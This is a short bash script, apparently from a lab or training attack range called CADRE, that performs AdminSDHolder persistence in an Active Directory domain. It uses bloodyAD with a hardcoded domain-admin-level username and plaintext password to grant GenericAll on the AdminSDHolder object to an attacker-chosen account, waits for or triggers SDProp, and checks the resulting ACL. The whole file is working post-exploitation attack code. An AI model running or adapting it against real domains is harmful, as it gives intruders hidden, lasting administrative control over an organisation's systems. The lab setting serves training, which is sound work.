#!/bin/bash
# CADRE — WT#025 AdminSDHolder Persistence (POST-EXPLOIT)
# POST-EXPLOIT: Requires DA-equivalent privileges (chief_command).
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#025 — AdminSDHolder Persistence (POST-EXPLOIT)"
start_attack "025" "AdminSDHolder Persistence"

require_tool bloodyAD
require_env DC01 "DC01"
require_env DOMAIN_ROOT "DOMAIN_ROOT"
require_env ATTACK_USER "ATTACK_USER"

step "Step 1: Grant GenericAll on AdminSDHolder to persistence user"
run_cmd "bloodyAD --host \"$DC01\" -d \"$DOMAIN_ROOT\" -u chief_command -p 'C0mm@nd_Ch1ef!' add genericall \"CN=AdminSDHolder,CN=System,DC=cadre,DC=local\" \"$DOMAIN_ROOT\\$ATTACK_USER\""

step "Step 2: Wait for SDProp cycle (60 min default) or trigger manually"
run_cmd "echo '[+] SDProp runs every 60 min. Trigger manually: use Invoke-SDProp on DC01.'"

step "Step 3: Verify the ACL is applied to protected objects"
run_cmd "bloodyAD --host \"$DC01\" -d \"$DOMAIN_ROOT\" -u chief_command -p 'C0mm@nd_Ch1ef!' get object \"CN=AdminSDHolder,CN=System,DC=cadre,DC=local\" --attr nTSecurityDescriptor"

result $? "AdminSDHolder persistence installed"
